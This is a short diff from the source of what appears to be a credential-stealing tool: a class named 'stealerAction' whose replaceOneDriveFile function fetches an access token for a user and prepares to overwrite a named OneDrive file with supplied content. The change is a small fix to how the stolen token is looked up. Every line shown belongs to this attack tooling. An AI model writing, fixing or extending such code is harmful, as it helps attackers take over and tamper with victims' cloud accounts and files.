@@ -545,7 +545,7 @@ class stealerAction():
 
 
     def replaceOneDriveFile(uuid, username, id, name, content):
-        accessToken = stealerAction.getAccessToken(username)
+        accessToken = stealerAction.getAccessToken(uuid, username)
         content_b64 = str(base64.b64encode(content).decode('ascii'))
         sig = hashlib.sha256(content_b64.encode('utf-8')).hexdigest()
         jsonBody = '{ "name": "%s" }' % name
